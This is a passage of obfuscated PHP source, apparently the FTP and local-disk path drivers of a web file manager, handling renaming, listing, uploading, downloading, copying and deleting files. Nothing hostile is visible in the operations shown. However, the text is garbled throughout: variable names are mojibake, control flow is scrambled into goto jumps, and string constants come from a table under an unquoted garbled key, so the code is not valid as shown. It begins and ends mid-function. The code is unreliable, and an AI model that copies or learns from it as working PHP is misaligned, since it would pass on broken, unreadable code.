$DÁÔﬁÁÂÀ∞); } } return @ftp_rmdir($this->connect, $dåàè∞∞ËÑ); } public function rename($cœöΩîÍ¡Ñ, $F·¡Ÿ∏ªÈÜ) { goto EÑÌÖÛØ”; c≥ÎÔä–èÚ: $AÑ∫¨©–Ñ = rtrim($AÖ®†€ÖÍÑ, $bº„ë€¢Âﬁ[8]) . $bº„ë€¢Âﬁ[8] . $DﬁïÜûÎˆ€; $FıŸ¯Çµ¿÷ = @ftp_rename($this->connect, $cœöΩîÍ¡Ñ, $AÑ∫¨©–Ñ); $AÑ∫¨©–Ñ = $this->iconvApp($AÑ∫¨©–Ñ); goto b∑®•Ω≈∞ƒ; dßˆÂèù∆…: $DﬁïÜûÎˆ€ = $this->iconvSystem($DﬁïÜûÎˆ€); $cœöΩîÍ¡Ñ = $this->iconvSystem($cœöΩîÍ¡Ñ); $AÖ®†€ÖÍÑ = $this->pathFather($cœöΩîÍ¡Ñ); goto c≥ÎÔä–èÚ; EÑÌÖÛØ”: $bº„ë€¢Âﬁ =& $_SERVER[∞„˜ƒÑºª]; if (!$this->_isconn()) { return !1; } $DﬁïÜûÎˆ€ = $this->fileNameAuto($this->pathFather($cœöΩîÍ¡Ñ), $F·¡Ÿ∏ªÈÜ); goto dßˆÂèù∆…; b∑®•Ω≈∞ƒ: return $FıŸ¯Çµ¿÷ ? $this->getPathOuter($AÑ∫¨©–Ñ) : !1; goto AˆÉ›Ü¶‘Û; AˆÉ›Ü¶‘Û: } public function size($dë‘ƒÚÿ∆•) { if (!$this->_isconn()) { return !1; } $dë‘ƒÚÿ∆• = $this->iconvSystem($dë‘ƒÚÿ∆•); return @ftp_size($this->connect, $dë‘ƒÚÿ∆•); } public function info($EØ«ÕùòÂ∏) { if (!$this->_isconn()) { return !1; } $EØ«ÕùòÂ∏ = $this->iconvSystem($EØ«ÕùòÂ∏); if ($this->isFile($EØ«ÕùòÂ∏)) { return $this->fileInfo($EØ«ÕùòÂ∏, 1); } else { if ($this->isFolder($EØ«ÕùòÂ∏)) { return $this->folderInfo($EØ«ÕùòÂ∏); } } return !1; } private function folderInfo($eÇÌºﬂ¢∫é, $A∆ÂÑß”ù = false, $bÖè†®—¿¡ = false) { $Fë‹ÜèÀ¿¬ =& $_SERVER[∞„˜ƒÑºª]; $E≠öÇî≤ÖÖ = $this->iconvApp($this->pathThis($eÇÌºﬂ¢∫é)); if ($bÖè†®—¿¡) { return array($Fë‹ÜèÀ¿¬[28] => $E≠öÇî≤ÖÖ, $Fë‹ÜèÀ¿¬[84] => $this->getPathOuter($eÇÌºﬂ¢∫é), $Fë‹ÜèÀ¿¬[29] => $Fë‹ÜèÀ¿¬[85]); } $f∑Èıõ¯‘é = array($Fë‹ÜèÀ¿¬[28] => $E≠öÇî≤ÖÖ, $Fë‹ÜèÀ¿¬[84] => $this->getPathOuter($eÇÌºﬂ¢∫é), $Fë‹ÜèÀ¿¬[29] => $Fë‹ÜèÀ¿¬[85], $Fë‹ÜèÀ¿¬[183] => $Fë‹ÜèÀ¿¬[50], $Fë‹ÜèÀ¿¬[109] => $Fë‹ÜèÀ¿¬[50], $Fë‹ÜèÀ¿¬[869] => !0, $Fë‹ÜèÀ¿¬[870] => !0); if ($A∆ÂÑß”ù) { $f∑Èıõ¯‘é[$Fë‹ÜèÀ¿¬[187]] = $this->has($eÇÌºﬂ¢∫é, !1); $f∑Èıõ¯‘é[$Fë‹ÜèÀ¿¬[188]] = $this->has($eÇÌºﬂ¢∫é, !0); } return $f∑Èıõ¯‘é; } private function fileInfo($cúÏùﬂóëÁ, $aªèêß°ﬂå = false) { $fÖñÁ¡ü‰ä =& $_SERVER[∞„˜ƒÑºª]; $cúÏùﬂóëÁ = rtrim($cúÏùﬂóëÁ, $fÖñÁ¡ü‰ä[8]) . $fÖñÁ¡ü‰ä[8]; $DæàËÈ¥É‘ = $this->iconvApp($this->pathThis($cúÏùﬂóëÁ)); if ($aªèêß°ﬂå) { return array($fÖñÁ¡ü‰ä[28] => $DæàËÈ¥É‘, $fÖñÁ¡ü‰ä[84] => $this->getPathOuter($cúÏùﬂóëÁ), $fÖñÁ¡ü‰ä[29] => $fÖñÁ¡ü‰ä[163], $fÖñÁ¡ü‰ä[156] => $this->ext($cúÏùﬂóëÁ), $fÖñÁ¡ü‰ä[86] => $this->size($cúÏùﬂóëÁ)); } $bÕò≠á∫ËÑ = array($fÖñÁ¡ü‰ä[28] => $DæàËÈ¥É‘, $fÖñÁ¡ü‰ä[84] => $this->getPathOuter($cúÏùﬂóëÁ), $fÖñÁ¡ü‰ä[29] => $fÖñÁ¡ü‰ä[163], $fÖñÁ¡ü‰ä[183] => $fÖñÁ¡ü‰ä[50], $fÖñÁ¡ü‰ä[109] => @ftp_mdtm($this->connect, $cúÏùﬂóëÁ), $fÖñÁ¡ü‰ä[156] => $this->ext($cúÏùﬂóëÁ), $fÖñÁ¡ü‰ä[86] => $this->size($cúÏùﬂóëÁ), $fÖñÁ¡ü‰ä[869] => !0, $fÖñÁ¡ü‰ä[870] => !0); return $bÕò≠á∫ËÑ; } public function exist($dªäı¥óÇ‰) { if (!$this->_isconn()) { return !1; } $dªäı¥óÇ‰ = $this->iconvSystem($dªäı¥óÇ‰); if ($this->size($dªäı¥óÇ‰) > -1) { return !0; } if ($this->isFolder($dªäı¥óÇ‰)) { return !0; } return !1; } public function isFile($Fƒ√£¶÷ôÚ) { $b·ºÚÚ«ﬂÂ =& $_SERVER[∞„˜ƒÑºª]; if ($Fƒ√£¶÷ôÚ == $b·ºÚÚ«ﬂÂ[8]) { return !1; } if (!$this->_isconn() || !$this->exist($Fƒ√£¶÷ôÚ)) { return !1; } @ftp_chdir($this->connect, $b·ºÚÚ«ﬂÂ[8]); $Fƒ√£¶÷ôÚ = $this->iconvSystem($Fƒ√£¶÷ôÚ); return !$this->_isFolder($Fƒ√£¶÷ôÚ); } public function isFolder($d≥ôºåÜ—ú) { if (!$this->_isconn()) { return !1; } @ftp_chdir($this->connect, $_SERVER[∞„˜ƒÑºª][8]); $d≥ôºåÜ—ú = $this->iconvSystem($d≥ôºåÜ—ú); return $this->_isFolder($d≥ôºåÜ—ú); } public function listPath($aÊéßà“Ôß, $B£À¡Ô©«Ó = false, $d√õé¨ÙÇÂ = false) { goto CØ·ó˜ââ≠; fï∫ÈºÛ÷Ë: foreach ($Eß‰›í“–ÿ as $aÊéßà“Ôß) { if ($this->_isFolder($aÊéßà“Ôß)) { $dÙû¡Â†áÚ[$A≈Ñãé‚±Œ[83]][] = $this->folderInfo($aÊéßà“Ôß, $B£À¡Ô©«Ó, $d√õé¨ÙÇÂ); } else { $dÙû¡Â†áÚ[$A≈Ñãé‚±Œ[82]][] = $this->fileInfo($aÊéßà“Ôß, $d√õé¨ÙÇÂ); } } return $dÙû¡Â†áÚ; goto b§π≠Ü‚ˆ¬; CØ·ó˜ââ≠: $A≈Ñãé‚±Œ =& $_SERVER[∞„˜ƒÑºª]; if (!$this->_isconn()) { return !1; } $aÊéßà“Ôß = $this->iconvSystem($aÊéßà“Ôß); goto Aëáÿµò´ü; Aëáÿµò´ü: $Eß‰›í“–ÿ = $this->ftpList($aÊéßà“Ôß); $dÙû¡Â†áÚ = array($A≈Ñãé‚±Œ[83] => array(), $A≈Ñãé‚±Œ[82] => array()); if (!$Eß‰›í“–ÿ) { return $dÙû¡Â†áÚ; } goto fï∫ÈºÛ÷Ë; b§π≠Ü‚ˆ¬: } private function _isFolder($F¨¢∫ÇªÛ≤) { return @ftp_chdir($this->connect, $F¨¢∫ÇªÛ≤); } public function has($D∞ÚØﬂ“ëÔ, $A∞ıΩàß◊ô = true) { if (!$this->_isconn()) { return !1; } $D∞ÚØﬂ“ëÔ = $this->iconvSystem($D∞ÚØﬂ“ëÔ); $aõ›ˆé‚⁄ú = $this->ftpList($D∞ÚØﬂ“ëÔ); if (!$aõ›ˆé‚⁄ú) { return !1; } foreach ($aõ›ˆé‚⁄ú as $D∞ÚØﬂ“ëÔ) { if ($A∞ıΩàß◊ô) { if (!$this->_isFolder($D∞ÚØﬂ“ëÔ)) { return !0; } } else { if ($this->_isFolder($D∞ÚØﬂ“ëÔ)) { return !0; } } } return !1; } public function listAll($Dÿö«≥õ¬å) { goto B’ÎˆÙóØ; eÀéÓÈË∏Ü: $aﬁÙ÷êÔ¨å = $this->recursionFtpFiles($Dÿö«≥õ¬å); $CÑó¢áÊ±… = array(); foreach ($aﬁÙ÷êÔ¨å[$DË≈¯™Ü◊«[83]] as $d∂µì‘ãó¡) { $CÑó¢áÊ±…[] = array($DË≈¯™Ü◊«[84] => $DË≈¯™Ü◊«[8] . trim(str_replace($Dÿö«≥õ¬å, $DË≈¯™Ü◊«[33], $d∂µì‘ãó¡), $DË≈¯™Ü◊«[8]) . $DË≈¯™Ü◊«[8], $DË≈¯™Ü◊«[85] => 1, $DË≈¯™Ü◊«[86] => 0); } goto B⁄¿ÇπÕÊ‚; B’ÎˆÙóØ: $DË≈¯™Ü◊« =& $_SERVER[∞„˜ƒÑºª]; if (!$this->_isconn()) { return !1; } $Dÿö«≥õ¬å = $this->iconvSystem($Dÿö«≥õ¬å); goto eÀéÓÈË∏Ü; B⁄¿ÇπÕÊ‚: foreach ($aﬁÙ÷êÔ¨å[$DË≈¯™Ü◊«[82]] as $e„öëÔéüä) { $CÑó¢áÊ±…[] = array($DË≈¯™Ü◊«[84] => $DË≈¯™Ü◊«[8] . trim(str_replace($Dÿö«≥õ¬å, $DË≈¯™Ü◊«[33], $e„öëÔéüä), $DË≈¯™Ü◊«[8]), $DË≈¯™Ü◊«[85] => 0, $DË≈¯™Ü◊«[86] => $this->size($e„öëÔéüä)); } return $CÑó¢áÊ±…; goto f…ó±™…Í¿; f…ó±™…Í¿: } public function getContent($F≤´≠ÁµΩé) { if (!$this->_isconn()) { return !1; } $F≤´≠ÁµΩé = $this->iconvSystem($F≤´≠ÁµΩé); return $this->fileSubstr($F≤´≠ÁµΩé); } public function setContent($bˆ´⁄≥´â«, $dÑÇ‚⁄ÙÑú = '') { goto FÎπºã‚‰å; bµÈÇé∫∫‚: $E‚◊Èñ£Ωº = $this->iconvApp($A∂º°≈≠öé); file_put_contents($A∂º°≈≠öé, $dÑÇ‚⁄ÙÑú); $eï¥èòÿÏÉ = $this->upload($bˆ´⁄≥´â«, $E‚◊Èñ£Ωº); goto E‡©ï◊ÿ©; FÎπºã‚‰å: if (!$this->_isconn()) { return !1; } $E◊⁄ùà„†ã = $this->pathThis($this->iconvSystem($bˆ´⁄≥´â«)); $A∂º°≈≠öé = $this->tempFile($E◊⁄ùà„†ã); goto bµÈÇé∫∫‚; E‡©ï◊ÿ©: $this->tempFileRemve($A∂º°≈≠öé); return $eï¥èòÿÏÉ; goto fåœèè±ôº; fåœèè±ôº: } public function fileSubstr($e‡‘äéŸÍ∆, $DãıáÆΩºü = 0, $A¿Ωªéóƒá = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($e‡‘äéŸÍ∆, $DãıáÆΩºü, $A¿Ωªéóƒá); } private function ftpRequest($DâäÃ°æ‹∞, $E≤õ¥éä‰à = 0, $aÈà´Ó¬ À = false) { goto FØ§ãøéÜá; fø”ØãÒﬁ¶: curl_setopt($e¢›Éå…ƒÇ, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($aÈà´Ó¬ À) { $cƒîã˜Ìáë = $E≤õ¥éä‰à + $aÈà´Ó¬ À - 1; curl_setopt($e¢›Éå…ƒÇ, CURLOPT_RANGE, "{$E≤õ¥éä‰à}\55{$cƒîã˜Ìáë}"); } curl_setopt($e¢›Éå…ƒÇ, CURLOPT_RETURNTRANSFER, 1); goto FÁéÖõë™Æ; FÁéÖõë™Æ: $d∆îÜúﬁÃ¿ = curl_exec($e¢›Éå…ƒÇ); curl_close($e¢›Éå…ƒÇ); return $d∆îÜúﬁÃ¿; goto füπê∑∏π©; FØ§ãøéÜá: $DâäÃ°æ‹∞ = $this->iconvSystem($DâäÃ°æ‹∞); $e¢›Éå…ƒÇ = curl_init(); curl_setopt($e¢›Éå…ƒÇ, CURLOPT_URL, "{$this->scheme}{$this->server}" . $this->pathEncode($DâäÃ°æ‹∞)); goto fø”ØãÒﬁ¶; füπê∑∏π©: } public function upload($cúÒ™–±¿¶, $cÎ”ìè ê≈, $A±À∏ê…ÚÍ = false, $F∑ŸŸæäõº = REPEAT_REPLACE) { goto c”Ö•“ô¢º; C∞¨ôÆüÜ√: if ($D≥ÆÒá®¥ı != FTP_FINISHED) { return !1; } return $this->getPathOuter($cúÒ™–±¿¶); goto C‹÷äõú„ô; c”Ö•“ô¢º: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($cúÒ™–±¿¶))) { return !1; } $cúÒ™–±¿¶ = $this->iconvSystem($cúÒ™–±¿¶); goto eñ›„¢…ÜÇ; eñ›„¢…ÜÇ: $cÎ”ìè ê≈ = $this->iconvSystem($cÎ”ìè ê≈); $D≥ÆÒá®¥ı = ftp_nb_put($this->connect, $cúÒ™–±¿¶, $cÎ”ìè ê≈, FTP_BINARY); while ($D≥ÆÒá®¥ı == FTP_MOREDATA) { $D≥ÆÒá®¥ı = ftp_nb_continue($this->connect); } goto C∞¨ôÆüÜ√; C‹÷äõú„ô: } public function download($CççΩ„Éú, $c‚∞á‹¥œÓ = '') { goto c⁄ÑêÒ≤óÏ; Cì¥™Ö¯Ü∂: while ($B€ÉÈû¥⁄ø == FTP_MOREDATA) { $B€ÉÈû¥⁄ø = ftp_nb_continue($this->connect); } if ($B€ÉÈû¥⁄ø != FTP_FINISHED) { return !1; } return $this->iconvApp($c‚∞á‹¥œÓ); goto eüãºàÏ“Ë; aòª∞Ãõù√: $CççΩ„Éú = $this->iconvSystem($CççΩ„Éú); $c‚∞á‹¥œÓ = $this->iconvSystem($c‚∞á‹¥œÓ); $B€ÉÈû¥⁄ø = ftp_nb_get($this->connect, $c‚∞á‹¥œÓ, $CççΩ„Éú, FTP_BINARY); goto Cì¥™Ö¯Ü∂; c⁄ÑêÒ≤óÏ: if (!$this->_isconn()) { return !1; } $DÕ˘˜Ú™‰≈ = $this->pathFather($c‚∞á‹¥œÓ); if (!IO::mkdir($DÕ˘˜Ú™‰≈)) { return !1; } goto aòª∞Ãõù√; eüãºàÏ“Ë: } private function ftpList($a≤»„¿ëéÊ) { $b’Û∞åÜ•⁄ =& $_SERVER[∞„˜ƒÑºª]; if (!$this->_isFolder($a≤»„¿ëéÊ)) { return !1; } @ftp_chdir($this->connect, $b’Û∞åÜ•⁄[8]); $a≤»„¿ëéÊ = $a≤»„¿ëéÊ == $b’Û∞åÜ•⁄[8] ? $a≤»„¿ëéÊ : $a≤»„¿ëéÊ . $b’Û∞åÜ•⁄[8]; $D¿·èËãª¶ = @ftp_nlist($this->connect, $a≤»„¿ëéÊ); return array_map(function ($bÑÂ÷‰çô ) { $CÂ†ˆãÎœá =& $_SERVER[∞„˜ƒÑºª]; return $CÂ†ˆãÎœá[8] . ltrim($bÑÂ÷‰çô , $CÂ†ˆãÎœá[8]); }, $D¿·èËãª¶); } private function recursionFtpFiles($bˆ‰“ú´ù≈) { $fÿÚ§Ãµ¢ã =& $_SERVER[∞„˜ƒÑºª]; if (!$this->_isconn()) { return !1; } if (!($eª™’¡ Îû = $this->ftpList($bˆ‰“ú´ù≈))) { return !1; } static $døæŒ©”Éö = array(); foreach ($eª™’¡ Îû as $bˆ‰“ú´ù≈) { if ($this->_isFolder($bˆ‰“ú´ù≈)) { $this->recursionFtpFiles($bˆ‰“ú´ù≈, $døæŒ©”Éö); $døæŒ©”Éö[$fÿÚ§Ãµ¢ã[83]][] = $bˆ‰“ú´ù≈; } else { $døæŒ©”Éö[$fÿÚ§Ãµ¢ã[82]][] = $bˆ‰“ú´ù≈; } } return $døæŒ©”Éö; } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($a”´πæ÷¨∏) { if (substr($a”´πæ÷¨∏, 0, 2) == $_SERVER[∞„˜ƒÑºª][861]) { $a”´πæ÷¨∏ = BASIC_PATH . substr($a”´πæ÷¨∏, 2); } return $a”´πæ÷¨∏; } public function iconvApp($eÂáó√¨‰ã) { $CÇÔû∏ΩÇÈ =& $_SERVER[∞„˜ƒÑºª]; global $config; return $this->iconvTo($eÂáó√¨‰ã, $config[$CÇÔû∏ΩÇÈ[859]], $config[$CÇÔû∏ΩÇÈ[858]]); } public function iconvSystem($c≠“¨¶¶ââ) { $Céûª«‹…„ =& $_SERVER[∞„˜ƒÑºª]; global $config; return $this->iconvTo($c≠“¨¶¶ââ, $config[$Céûª«‹…„[858]], $config[$Céûª«‹…„[859]]); } public function getPathOuter($bë◊ªÓ±ªá) { goto DåÂ÷ƒëàé; cäﬁéÜƒ¡§: return $this->pathDriver . $aÉÊÔ¥÷†ˆ[8] . ltrim($bë◊ªÓ±ªá, $aÉÊÔ¥÷†ˆ[8]); goto cã—ıﬂ‘è√; C’∏¯”…é¬: $bë◊ªÓ±ªá = KodIO::clear($bë◊ªÓ±ªá); $bë◊ªÓ±ªá = substr($bë◊ªÓ±ªá, strlen($FÉè•ˆ© ô)); if (empty($this->pathDriver)) { return $bë◊ªÓ±ªá; } goto cäﬁéÜƒ¡§; DåÂ÷ƒëàé: $aÉÊÔ¥÷†ˆ =& $_SERVER[∞„˜ƒÑºª]; $FÉè•ˆ© ô = $this->iconvApp($this->pathBase); $bë◊ªÓ±ªá = $this->iconvApp($bë◊ªÓ±ªá); goto B®Ïå€Â¬; B®Ïå€Â¬: if (substr($FÉè•ˆ© ô, 0, 2) == $aÉÊÔ¥÷†ˆ[861]) { $FÉè•ˆ© ô = BASIC_PATH . substr($FÉè•ˆ© ô, 2); } if (substr($bë◊ªÓ±ªá, 0, 2) == $aÉÊÔ¥÷†ˆ[861]) { $bë◊ªÓ±ªá = BASIC_PATH . substr($bë◊ªÓ±ªá, 2); } $FÉè•ˆ© ô = KodIO::clear($FÉè•ˆ© ô); goto C’∏¯”…é¬; cã—ıﬂ‘è√: } public function mkfile($bÍÏ¨πô—π, $BÎﬁ⁄Ôı›¬ = '', $F§û≤µ‘ÿÉ = REPEAT_RENAME) { $bÍÏ¨πô—π = $this->iconvSystem($bÍÏ¨πô—π); @touch($bÍÏ¨πô—π); if ($BÎﬁ⁄Ôı›¬) { file_put_contents($bÍÏ¨πô—π, $BÎﬁ⁄Ôı›¬); } return is_file($bÍÏ¨πô—π) ? $this->getPathOuter($bÍÏ¨πô—π) : !1; } public function mkdir($Aá¶¨¿ﬁ∞´, $dÑÓ»‡ú‹ÿ = REPEAT_SKIP) { $Aá¶¨¿ﬁ∞´ = $this->iconvSystem($Aá¶¨¿ﬁ∞´); if (is_dir($Aá¶¨¿ﬁ∞´)) { return $this->getPathOuter($Aá¶¨¿ﬁ∞´); } @mkdir($Aá¶¨¿ﬁ∞´, 511, !0); return is_dir($Aá¶¨¿ﬁ∞´) ? $this->getPathOuter($Aá¶¨¿ﬁ∞´) : !1; } public function copyFile($cπéäÎÁºÁ, $EÔÿ†Ç›≤Ø) { $this->mkdir($this->pathFather($EÔÿ†Ç›≤Ø)); $cπéäÎÁºÁ = $this->iconvSystem($cπéäÎÁºÁ); $EÔÿ†Ç›≤Ø = $this->iconvSystem($EÔÿ†Ç›≤Ø); $e‰‘Ω¢ıÎˆ = @copy($cπéäÎÁºÁ, $EÔÿ†Ç›≤Ø); return $e‰‘Ω¢ıÎˆ ? $this->getPathOuter($EÔÿ†Ç›≤Ø) : !1; } public function moveFile($A∆„Û⁄òÙÊ, $D¨ô∏öµÆ≥) { $this->mkdir($this->pathFather($D¨ô∏öµÆ≥)); $A∆„Û⁄òÙÊ = $this->iconvSystem($A∆„Û⁄òÙÊ); $D¨ô∏öµÆ≥ = $this->iconvSystem($D¨ô∏öµÆ≥); $e∂—ôüâ˘√ = intval(@rename($A∆„Û⁄òÙÊ, $D¨ô∏öµÆ≥)); if (!$e∂—ôüâ˘√) { if ($e∂—ôüâ˘√ = intval(@copy($A∆„Û⁄òÙÊ, $D¨ô∏öµÆ≥))) { @unlink($A∆„Û⁄òÙÊ); } } return $e∂—ôüâ˘√ ? $this->getPathOuter($D¨ô∏öµÆ≥) : !1; } public function delFile($a—âØÇ”Îì) { $a—âØÇ”Îì = $this->iconvSystem($a—âØÇ”Îì); if (!@unlink($a—âØÇ”Îì)) { @chmod($a—âØÇ”Îì, 511); if (!@unlink($a—âØÇ”Îì)) { return !1; } } else { return !0; } } public function delFolder($CÇö≥„Ó––) { goto C¬æµ‚≠ä√; cõ§ëÈΩÛÆ: return rmdir($CÇö≥„Ó––); goto E€«¯”∞ƒ„; C¬æµ‚≠ä√: $D∫ù¨ﬂà˜∑ =& $_SERVER[∞„˜ƒÑºª]; $CÇö≥„Ó–– = $this->iconvSystem($CÇö≥„Ó––); if (!is_dir($CÇö≥„Ó––)) { return !0; } goto c‡¥ÓπËÌ¥; c‡¥ÓπËÌ¥: if (!($F≠ãÿÁÂªÎ = opendir($CÇö≥„Ó––))) { return !1; } while (($aÍ¬ÔÃ–ù = readdir($F≠ãÿÁÂªÎ)) !== !1) { if ($aÍ¬ÔÃ–ù == $D∫ù¨ﬂà˜∑[98] || $aÍ¬ÔÃ–ù == $D∫ù¨ﬂà˜∑[871]) { continue; } $aÑìú∫É®¨ = $CÇö≥„Ó–– . $D∫ù¨ﬂà˜∑[8] . $aÍ¬ÔÃ–ù; if (!is_dir($aÑìú∫É®¨)) { if (!unlink($aÑìú∫É®¨)) { chmod($aÑìú∫É®¨, 511); if (!unlink($aÑìú∫É®¨)) { return !1; } } } else { chmod($aÑìú∫É®¨, 511); $aÑìú∫É®¨ = $this->iconvApp($aÑìú∫É®¨); if (!$this->delFolder($aÑìú∫É®¨)) { return !1; } } } closedir($F≠ãÿÁÂªÎ); goto cõ§ëÈΩÛÆ; E€«¯”∞ƒ„: } public function rename($Aû˜ÑΩ®ôø, $c Í«‹ß»†) { goto c¬ïÈ®Œ‘ß; BÓÂºö¯∫Ë: $Aû˜ÑΩ®ôø = $this->iconvSystem($Aû˜ÑΩ®ôø); $a©◊…»Ï√á = $this->pathFather($Aû˜ÑΩ®ôø); $AÒ‰àÛõÇÑ = rtrim($a©◊…»Ï√á, $Bπ•ûΩÚ„ó[8]) . $Bπ•ûΩÚ„ó[8] . $bÆŒ√◊ÇÇß; goto F¿¶ª˘ÏÃÛ; c¬ïÈ®Œ‘ß: $Bπ•ûΩÚ„ó =& $_SERVER[∞„˜ƒÑºª]; $bÆŒ√◊ÇÇß = $this->fileNameAuto($this->pathFather($Aû˜ÑΩ®ôø), $c Í«‹ß»†); $bÆŒ√◊ÇÇß = $this->iconvSystem($bÆŒ√◊ÇÇß); goto BÓÂºö¯∫Ë; F¿¶ª˘ÏÃÛ: $cÎÉﬂÍÖ„ˆ = @rename($Aû˜ÑΩ®ôø, $AÒ‰àÛõÇÑ); $AÒ‰àÛõÇÑ = $this->iconvApp($AÒ‰àÛõÇÑ); return $cÎÉﬂÍÖ„ˆ ? $this->getPathOuter($AÒ‰àÛõÇÑ) : !1; goto a™îÔÖñœ‘; a™îÔÖñœ‘: } public function size($aãéÉ«Üø) { $aãéÉ«Üø = $this->iconvSystem($aãéÉ«Üø); return (double) abs(sprintf($_SERVER[∞„˜ƒÑºª][872], @filesize($aãéÉ«Üø))); } public function info($dƒﬁò¡æÒÜ) { $dƒﬁò¡æÒÜ = $this->iconvSystem($dƒﬁò¡æÒÜ); if ($this->isFolder($dƒﬁò¡æÒÜ)) { return $this->folderInfo($dƒﬁò¡æÒÜ, !0); } else { if ($this->isFile($dƒﬁò¡æÒÜ)) { return $this->fileInfo($dƒﬁò¡æÒÜ); } } return !1; } protected function infoChildren($eÉ≥¿ÿÌáª, &$aÔñúïß∂ı) { $a·™∆«í∏· =& $_SERVER[∞„˜ƒÑºª]; $eÉ≥¿ÿÌáª = rtrim($eÉ≥¿ÿÌáª, $a·™∆«í∏·[8]) . $a·™∆«í∏·[8]; $eÉ≥¿ÿÌáª = $this->iconvSystem($eÉ≥¿ÿÌáª); if (!($B‰Ã¿™ÁÍê = @opendir($eÉ≥¿ÿÌáª))) { return; } while (($Dﬂ©ÛÆ¢ï“ = readdir($B‰Ã¿™ÁÍê)) !== !1) { if ($Dﬂ©ÛÆ¢ï“ == $a·™∆«í∏·[98] || $Dﬂ©ÛÆ¢ï“ == $a·™∆«í∏·[871]) { continue; } $aµ◊’ôÏ¿¶ = $eÉ≥¿ÿÌáª . $Dﬂ©ÛÆ¢ï“; $aÔ÷’»˜ë· = $this->iconvApp($aµ◊’ôÏ¿¶); if (is_file($aµ◊’ôÏ¿¶)) { $aÔñúïß∂ı[$a·™∆«í∏·[87]]++; $aÔñúïß∂ı[$a·™∆«í∏·[86]] += $this->size($aÔ÷’»˜ë·); } else { $aÔñúïß∂ı[$a·™∆«í∏·[88]]++; $this->infoChildren($aÔ÷’»˜ë·, $aÔñúïß∂ı); } } closedir($B‰Ã¿™ÁÍê); } private function folderInfo($cñÀ—√îí, $Aˆºâ±˘£˜ = false, $E≤√‚∫éûÇ = false) { goto bª⁄∆†íé∫; dîÃØ®Û≈á: return $C©‰≠ø¢à–; goto cÑêàÛî‘›; cŒÍÙ§‚æñ: if ($E≤√‚∫éûÇ) { return array($bÉà≤ìΩœÉ[28] => $Cñƒ‡àıú”, $bÉà≤ìΩœÉ[84] => $this->getPathOuter($cñÀ—√îí), $bÉà≤ìΩœÉ[29] => $bÉà≤ìΩœÉ[85]); } $C©‰≠ø¢à– = array($bÉà≤ìΩœÉ[28] => $Cñƒ‡àıú”, $bÉà≤ìΩœÉ[84] => $this->getPathOuter($cñÀ—√îí), $bÉà≤ìΩœÉ[29] => $bÉà≤ìΩœÉ[85], $bÉà≤ìΩœÉ[183] => @filectime($cñÀ—√îí), $bÉà≤ìΩœÉ[109] => @filemtime($cñÀ—√îí), $bÉà≤ìΩœÉ[869] => is_readable($cñÀ—√îí), $bÉà≤ìΩœÉ[870] => is_writable($cñÀ—√îí), $bÉà≤ìΩœÉ[873] => get_mode($cñÀ—√îí)); if ($Aˆºâ±˘£˜) { $C©‰≠ø¢à–[$bÉà≤ìΩœÉ[187]] = $this->has($cñÀ—√îí, !1); $C©‰≠ø¢à–[$bÉà≤ìΩœÉ[188]] = $this->has($cñÀ—√îí, !0); } goto dîÃØ®Û≈á; bª⁄∆†íé∫: $bÉà≤ìΩœÉ =& $_SERVER[∞„˜ƒÑºª]; $cñÀ—√îí = rtrim($cñÀ—√îí, $bÉà≤ìΩœÉ[8]) . $bÉà≤ìΩœÉ[8]; $Cñƒ‡àıú” = $this->iconvApp($this->pathThis($cñÀ—√îí)); goto cŒÍÙ§‚æñ; cÑêàÛî‘›: } private function fileInfo($c÷Î‰Ø÷øØ, $e√√ì¨ë∞˘ = false) { $FêúåÃüê =& $_SERVER[∞„˜ƒÑºª]; $D¯ãûâËµ∂ = $this->iconvApp($this->pathThis($c÷Î‰Ø÷øØ)); if ($e√√ì¨ë∞˘) { return array($FêúåÃüê[28] => $D¯ãûâËµ∂, $FêúåÃüê[84] => $this->getPathOuter($c÷Î‰Ø÷øØ), $FêúåÃüê[29] => $FêúåÃüê[163], $FêúåÃüê[86] => $this->size($c÷Î‰Ø÷øØ), $FêúåÃüê[156] => $this->ext($D¯ãûâËµ∂)); } $aêˆÛÙÂ—≤ = array($FêúåÃüê[28] => $D¯ãûâËµ∂, $FêúåÃüê[84] => $this->getPathOuter($c÷Î‰Ø÷øØ), $FêúåÃüê[29] => $FêúåÃüê[163], $FêúåÃüê[183] => @filectime($c÷Î‰Ø÷øØ), $FêúåÃüê[109] => @filemtime($c÷Î‰Ø÷øØ), $FêúåÃüê[86] => $this->size($c÷Î‰Ø÷øØ), $FêúåÃüê[156] => $this->ext($D¯ãûâËµ∂), $FêúåÃüê[869] => is_readable($c÷Î‰Ø÷øØ), $FêúåÃüê[870] => is_writable($c÷Î‰Ø÷øØ), $FêúåÃüê[873] => get_mode($c÷Î‰Ø÷øØ)); $this->fileInfoImage($c÷Î‰Ø÷øØ, $aêˆÛÙÂ—≤); return $aêˆÛÙÂ—≤; } public function exist($f‚Êïçë§£) { $f‚Êïçë§£ = $this->iconvSystem($f‚Êïçë§£); return @file_exists($f‚Êïçë§£); } public function isFile($aœ∏ãÓûœû) { $aœ∏ãÓûœû = $this->iconvSystem($aœ∏ãÓûœû); return @is_file($aœ∏ãÓûœû); } public function isFolder($fŸòÀåﬂ˜ó) { $fŸòÀåﬂ˜ó = $this->iconvSystem($fŸòÀåﬂ˜ó); return @is_dir($fŸòÀåﬂ˜ó); } private function fileInfoImage($eÕ‚ßÇªé∫, &$aã®≠áÓ≤√) { $cŒ±±¿¨∑° =& $_SERVER[∞„˜ƒÑºª]; $Fƒ–ËèÑ‘— = array($cŒ±±¿¨∑°[204], $cŒ±±¿¨∑°[157], $cŒ±±¿¨∑°[205], $cŒ±±¿¨∑°[206], $cŒ±±¿¨∑°[207]); if (in_array($aã®≠áÓ≤√[$cŒ±±¿¨∑°[156]], $Fƒ–ËèÑ‘—)) { $a£ÁÍ¬øéÑ = GetImageSize($eÕ‚ßÇªé∫); if ($a£ÁÍ¬øéÑ) { $aã®≠áÓ≤√[$cŒ±±¿¨∑°[208]] = array($cŒ±±¿¨∑°[209] => $a£ÁÍ¬øéÑ[0], $cŒ±±¿¨∑°[874] => $a£ÁÍ¬øéÑ[1]); } } } public function listPath($C”‘›∞ÑøŒ, $dÈœΩ◊≠ôÎ = true, $d”ë‘ø÷ı¨ = false) { goto cœÉæ•àíü; C•ﬁÈ◊ò∆¥: closedir($d“Ïú≤·•ù); return $BÎ˜Îæ◊ˆ«; goto Eî‡ãàñã›; aîÈë»Ñ÷“: 